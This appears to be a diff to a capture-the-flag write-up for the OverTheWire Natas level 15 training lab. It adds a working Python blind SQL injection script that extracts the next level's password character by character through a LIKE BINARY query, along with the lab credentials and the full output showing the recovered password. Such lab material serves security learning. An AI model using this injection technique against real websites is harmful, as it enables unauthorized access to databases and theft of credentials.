@@ -34,3 +34,63 @@ natas16" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.tables WHERE table_schema 
 The information_schema.tables will allow us to view all the information from the tables within a database.
 
 
+import string
+import requests
+
+characters = string.ascii_letters + string.digits
+url = "http://natas15.natas.labs.overthewire.org/"
+auth_username = "natas15"
+auth_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
+password = ""
+passlength = 32
+exists_str = "This user exists."
+
+# go through the loop till password is 32 characters long and then go into the loop passing all characters
+while len(password) != 32:
+    for char in characters:
+        uri = ''.join([url, '?debug&', 'username=natas16"', '+and+password+LIKE+BINARY+"', password + char, '%'])
+        r = requests.get(uri, auth=(auth_username, auth_password))
+        if exists_str in r.text:
+            password = password + char
+            print("Password: {0}".format(password))
+
+BINARY is added as it doesn't check for lowercase and uppercase letters specifically.
+
+
+
+
+python3 natas15.py
+Password: W
+Password: Wa
+Password: WaI
+Password: WaIH
+Password: WaIHE
+Password: WaIHEa
+Password: WaIHEac
+Password: WaIHEacj
+Password: WaIHEacj6
+Password: WaIHEacj63
+Password: WaIHEacj63w
+Password: WaIHEacj63wn
+Password: WaIHEacj63wnN
+Password: WaIHEacj63wnNI
+Password: WaIHEacj63wnNIB
+Password: WaIHEacj63wnNIBR
+Password: WaIHEacj63wnNIBRO
+Password: WaIHEacj63wnNIBROH
+Password: WaIHEacj63wnNIBROHe
+Password: WaIHEacj63wnNIBROHeq
+Password: WaIHEacj63wnNIBROHeqi
+Password: WaIHEacj63wnNIBROHeqi3
+Password: WaIHEacj63wnNIBROHeqi3p
+Password: WaIHEacj63wnNIBROHeqi3p9
+Password: WaIHEacj63wnNIBROHeqi3p9t
+Password: WaIHEacj63wnNIBROHeqi3p9t0
+Password: WaIHEacj63wnNIBROHeqi3p9t0m
+Password: WaIHEacj63wnNIBROHeqi3p9t0m5
+Password: WaIHEacj63wnNIBROHeqi3p9t0m5n
+Password: WaIHEacj63wnNIBROHeqi3p9t0m5nh
+Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhm
+Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+
